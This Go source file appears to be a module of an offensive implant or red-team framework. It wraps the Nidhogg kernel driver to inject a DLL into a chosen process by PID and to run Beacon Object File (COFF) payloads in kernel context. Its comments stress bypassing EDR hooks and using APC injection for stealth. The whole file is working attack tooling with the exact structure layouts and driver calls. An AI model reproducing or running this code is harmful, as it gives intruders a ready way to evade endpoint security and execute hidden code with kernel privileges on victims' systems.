package ttp

// nidhogg_memory.go -- Memory/execution domain TTPs via Nidhogg kernel driver
//
// TTP 71: kernel-level DLL injection (IOCTL_INJECT_DLL)
//   Bypasses user-mode EDR hooks on CreateRemoteThread / WriteProcessMemory.
//   struct IoctlDllInfo has no pointer members -- safe to pass directly.
//
// TTP 72: COFF/BOF execution without file (IOCTL_EXEC_NOF)
//   Executes a raw COFF object (Beacon Object File) in kernel context.
//   EntryName selects the COFF export to call; Data is the raw COFF bytes.
//
// Both TTPs return ErrNidhoggNotAvailable if the driver is not loaded.

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"runtime"
	"strconv"
	"strings"
	"unsafe"
)

// NidhoggKernelInjectDLL injects a DLL into a target process via the kernel driver.
// Unlike userland TTP 50, this bypasses EDR hooks on VirtualAllocEx/WriteProcessMemory.
// params: "pid dllpath [apc]"
//
// IoctlDllInfo layout (IoctlShared.h):
//   InjectionType Type  (int enum, 4 bytes, offset 0) -- APCInjection=0, CreateThreadInjection=1
//   unsigned long Pid   (4 bytes, offset 4)
//   CHAR DllPath[260]   (260 bytes, offset 8)
// Total: 272 bytes. Fully inline -- no pointer issues.
func NidhoggKernelInjectDLL(params string) (string, error) {
	parts := strings.Fields(strings.TrimSpace(params))
	if len(parts) < 2 {
		return "", fmt.Errorf("params: pid dllpath [apc]")
	}
	pidN, err := strconv.ParseUint(parts[0], 10, 32)
	if err != nil {
		return "", fmt.Errorf("invalid pid: %s", parts[0])
	}
	pid := uint32(pidN)
	dllPath := parts[1]
	useAPC := len(parts) >= 3 && strings.ToLower(parts[2]) == "apc"

	if _, err := os.Stat(dllPath); err != nil {
		return "", fmt.Errorf("dll not found: %s", dllPath)
	}

	buf := make([]byte, 272)
	// InjectionType: 0=APC (stealth), 1=CreateThread (noisy)
	if !useAPC {
		binary.LittleEndian.PutUint32(buf[0:], 1) // CreateThreadInjection
	}
	// APCInjection = 0, already zero
	binary.LittleEndian.PutUint32(buf[4:], pid)
	// DllPath as ASCII NUL-terminated (max 259 chars + NUL)
	pathBytes := []byte(dllPath)
	if len(pathBytes) > 259 {
		pathBytes = pathBytes[:259]
	}
	copy(buf[8:], pathBytes)

	if _, err := ioctl(ioctlInjectDLL, buf, nil); err != nil {
		return "", err
	}
	mode := "thread"
	if useAPC {
		mode = "apc"
	}
	return fmt.Sprintf("[nidhogg:inject:dll:%s] %s -> pid %d (kernel)", mode, dllPath, pid), nil
}

// NidhoggExecNof executes a COFF/BOF object in kernel via IOCTL_EXEC_NOF.
// params: "entryname b64:<coff_bytes> [b64:<param_bytes>]"
// Example: "go b64:TVqQ..." (execute the 'go' export of the COFF)
//
// IoctlCoff layout (IoctlShared.h, 64-bit, MSVC default packing):
//   CHAR EntryName[260]  (260 bytes, offset 0)
//   [4 bytes padding to align PVOID to 8 bytes]
//   PVOID Data           (8 bytes, offset 264) -- user-mode pointer to COFF bytes
//   SIZE_T DataSize      (8 bytes, offset 272)
//   PVOID Parameter      (8 bytes, offset 280) -- optional parameter (may be nil)
//   SIZE_T ParameterSize (8 bytes, offset 288)
// Total: 296 bytes.
// Data and Parameter are user-mode pointers; we pin them with runtime.KeepAlive.
func NidhoggExecNof(params string) (string, error) {
	parts := strings.Fields(strings.TrimSpace(params))
	if len(parts) < 2 {
		return "", fmt.Errorf("params: entryname b64:<coff_bytes> [b64:<param_bytes>]")
	}

	entryName := parts[0]

	coffData, err := decodeNofArg(parts[1])
	if err != nil {
		return "", fmt.Errorf("coff data: %w", err)
	}
	if len(coffData) == 0 {
		return "", fmt.Errorf("coff data is empty")
	}

	var paramData []byte
	if len(parts) >= 3 {
		paramData, err = decodeNofArg(parts[2])
		if err != nil {
			return "", fmt.Errorf("param data: %w", err)
		}
	}

	buf := make([]byte, 296)

	// EntryName (ASCII, NUL-terminated, max 259 chars)
	en := []byte(entryName)
	if len(en) > 259 {
		en = en[:259]
	}
	copy(buf[0:], en)

	// Data pointer at offset 264
	dataPtr := uintptr(unsafe.Pointer(&coffData[0]))
	for i := 0; i < 8; i++ {
		buf[264+i] = byte(dataPtr >> (uint(i) * 8))
	}
	// DataSize at offset 272
	binary.LittleEndian.PutUint64(buf[272:], uint64(len(coffData)))

	// Parameter pointer at offset 280 (optional)
	if len(paramData) > 0 {
		paramPtr := uintptr(unsafe.Pointer(&paramData[0]))
		for i := 0; i < 8; i++ {
			buf[280+i] = byte(paramPtr >> (uint(i) * 8))
		}
		binary.LittleEndian.PutUint64(buf[288:], uint64(len(paramData)))
	}

	_, err = ioctl(ioctlExecNof, buf, nil)
	runtime.KeepAlive(coffData)
	runtime.KeepAlive(paramData)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("[nidhogg:nof] COFF entry=%s size=%d bytes executed in kernel", entryName, len(coffData)), nil
}

func decodeNofArg(arg string) ([]byte, error) {
	if strings.HasPrefix(arg, "b64:") {
		raw, err := base64.StdEncoding.DecodeString(arg[4:])
		if err != nil {
			raw, err = base64.URLEncoding.DecodeString(arg[4:])
			if err != nil {
				return nil, fmt.Errorf("base64 decode: %w", err)
			}
		}
		return raw, nil
	}
	if strings.HasPrefix(arg, "file:") {
		data, err := os.ReadFile(arg[5:])
		if err != nil {
			return nil, fmt.Errorf("read file: %w", err)
		}
		return data, nil
	}
	return nil, fmt.Errorf("prefix with b64: or file:")
}
